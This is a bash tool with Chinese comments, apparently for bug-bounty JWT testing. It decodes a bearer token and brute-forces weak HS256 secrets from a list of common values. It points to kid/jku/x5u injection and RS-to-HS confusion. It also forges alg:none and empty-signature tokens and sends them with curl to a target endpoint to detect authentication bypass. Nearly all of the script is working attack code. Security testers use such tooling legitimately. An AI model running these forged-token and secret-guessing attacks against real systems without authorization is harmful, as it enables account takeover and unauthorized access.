#!/usr/bin/env bash
# hunt-jwt.sh — JWT decode + weakness probe
# 來源：generic pattern，任何 Bearer token auth 系統都該測
#
# 檢測：
#   1. JWT decode（header + payload）
#   2. alg:none acceptance test
#   3. HS256 weak secret brute（small wordlist）
#   4. exp 狀態（expired / far future）
#   5. kid / jku / x5u injection surface
#   6. Public key confusion（RS256 → HS256 with public key as secret）
#
# 用法：
#   ./hunt-jwt.sh <JWT_TOKEN>
#   ./hunt-jwt.sh <JWT_TOKEN> --endpoint https://api.target.com/me   # 測 alg:none 會不會被接受
set -uo pipefail

TOKEN="${1:-}"
[ -z "$TOKEN" ] && { echo "Usage: $0 <JWT_TOKEN> [--endpoint <url>]"; exit 1; }
shift || true

ENDPOINT=""
while [ $# -gt 0 ]; do
  case "$1" in
    --endpoint) ENDPOINT="$2"; shift 2;;
    *) shift;;
  esac
done

OUT_DIR="${OUT_DIR:-./jwt_out}"
mkdir -p "$OUT_DIR"
SLUG=$(echo "$TOKEN" | head -c 20 | tr -d '.')
OUT="$OUT_DIR/${SLUG}.txt"
: > "$OUT"

log(){ echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit(){ echo "🔴 $*" | tee -a "$OUT"; }
warn(){ echo "🟡 $*" | tee -a "$OUT"; }

# Basic format check
if [[ ! "$TOKEN" =~ ^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+(\.[A-Za-z0-9_-]*)?$ ]]; then
  echo "not a JWT (must be eyJ...eyJ...xxx)" | tee -a "$OUT"
  exit 1
fi

log "=== JWT hunt: ${TOKEN:0:30}... ==="

# ── Decode header + payload ─────────────────────────────────────
IFS='.' read -r H P S <<< "$TOKEN"

b64url_decode() {
  local s="$1"
  local n=$((${#s} % 4))
  [ "$n" -ne 0 ] && s="${s}$(printf '=%.0s' $(seq 1 $((4 - n))))"
  echo "$s" | tr '_-' '/+' | base64 -d 2>/dev/null
}

HEADER_JSON=$(b64url_decode "$H")
PAYLOAD_JSON=$(b64url_decode "$P")

echo "header:  $HEADER_JSON" | tee -a "$OUT"
echo "payload: $PAYLOAD_JSON" | tee -a "$OUT"

ALG=$(echo "$HEADER_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin).get('alg',''))" 2>/dev/null)
KID=$(echo "$HEADER_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin).get('kid',''))" 2>/dev/null)
JKU=$(echo "$HEADER_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin).get('jku',''))" 2>/dev/null)
X5U=$(echo "$HEADER_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin).get('x5u',''))" 2>/dev/null)
TYP=$(echo "$HEADER_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin).get('typ',''))" 2>/dev/null)

EXP=$(echo "$PAYLOAD_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin).get('exp',''))" 2>/dev/null)
IAT=$(echo "$PAYLOAD_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin).get('iat',''))" 2>/dev/null)
ISS=$(echo "$PAYLOAD_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin).get('iss',''))" 2>/dev/null)
SUB=$(echo "$PAYLOAD_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin).get('sub',''))" 2>/dev/null)
AUD=$(echo "$PAYLOAD_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin).get('aud',''))" 2>/dev/null)

echo "  alg=$ALG  kid=$KID  typ=$TYP" >> "$OUT"
echo "  iss=$ISS  sub=$SUB  aud=$AUD" >> "$OUT"

# ── Exp check ──────────────────────────────────────────────────
if [ -n "$EXP" ]; then
  NOW=$(date +%s)
  DIFF=$((EXP - NOW))
  if [ "$DIFF" -lt 0 ]; then
    warn "EXP expired $((- DIFF))s ago"
  elif [ "$DIFF" -gt 31536000 ]; then
    hit "EXP far future: $((DIFF / 86400)) days → long-lived token"
  else
    echo "  exp in $((DIFF / 60)) minutes" >> "$OUT"
  fi
else
  hit "no EXP claim → token never expires"
fi

# ── Algorithm-specific checks ──────────────────────────────────
case "$ALG" in
  none|NONE|None)
    hit "alg:none already — verifier MUST reject, test vs endpoint"
    ;;
  HS256|HS384|HS512)
    warn "HS256/384/512 uses shared secret — test weak secret brute"
    echo "  wordlist probe (10 common secrets)..." >> "$OUT"
    # Simple Python HS256 brute against the token
    python3 - "$TOKEN" >> "$OUT" <<'PYEOF'
import sys, hmac, hashlib, base64
tok = sys.argv[1]
h, p, s_b64 = tok.rsplit('.', 2)
msg = (h + '.' + p).encode()
try:
    expected = base64.urlsafe_b64decode(s_b64 + '=' * (-len(s_b64) % 4))
except Exception:
    print("  (cannot decode signature)"); sys.exit(0)
secrets = ['secret','Secret','SECRET','jwtsecret','jwt_secret','key','password','admin','default','changeme','test','123456','your-256-bit-secret','mysecret','supersecret']
for sec in secrets:
    mac = hmac.new(sec.encode(), msg, hashlib.sha256).digest()
    if mac == expected:
        print(f"🔴 HS256 WEAK SECRET: '{sec}'")
        break
else:
    print("  (no match in common secrets)")
PYEOF
    ;;
  RS256|RS384|RS512|ES256|ES384|ES512)
    warn "asymmetric alg — test alg confusion (RS→HS256 with public key)"
    ;;
  *)
    warn "unusual alg: $ALG"
    ;;
esac

# ── Injection surface via kid / jku / x5u ──────────────────────
if [ -n "$KID" ]; then
  warn "kid header present: '$KID' — test SQLi / LFI / command injection in kid"
fi
if [ -n "$JKU" ]; then
  hit "jku header present: $JKU → if attacker-controllable URL accepted → full forge"
fi
if [ -n "$X5U" ]; then
  hit "x5u header present: $X5U → if attacker-controllable URL accepted → full forge"
fi

# ── alg:none endpoint test ─────────────────────────────────────
if [ -n "$ENDPOINT" ]; then
  log "testing alg:none acceptance at $ENDPOINT..."
  # Create a new token with alg:none
  NONE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
  NONE_TOKEN="${NONE_HEADER}.${P}."

  # Original token
  ORIG_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 \
    -H "Authorization: Bearer $TOKEN" "$ENDPOINT")
  # alg:none
  NONE_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 \
    -H "Authorization: Bearer $NONE_TOKEN" "$ENDPOINT")
  echo "  original → HTTP $ORIG_CODE" >> "$OUT"
  echo "  alg:none → HTTP $NONE_CODE" >> "$OUT"
  if [ "$NONE_CODE" = "200" ] && [ "$ORIG_CODE" = "200" ]; then
    hit "alg:none ACCEPTED at $ENDPOINT → total auth bypass"
  elif [[ "$NONE_CODE" =~ ^(401|403)$ ]]; then
    echo "  alg:none rejected (expected)" >> "$OUT"
  fi

  # Empty signature
  EMPTY_TOKEN="${H}.${P}."
  EMPTY_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 \
    -H "Authorization: Bearer $EMPTY_TOKEN" "$ENDPOINT")
  echo "  empty sig → HTTP $EMPTY_CODE" >> "$OUT"
  if [ "$EMPTY_CODE" = "200" ]; then
    hit "empty signature ACCEPTED at $ENDPOINT → auth bypass"
  fi
fi

log "=== done → $OUT ==="
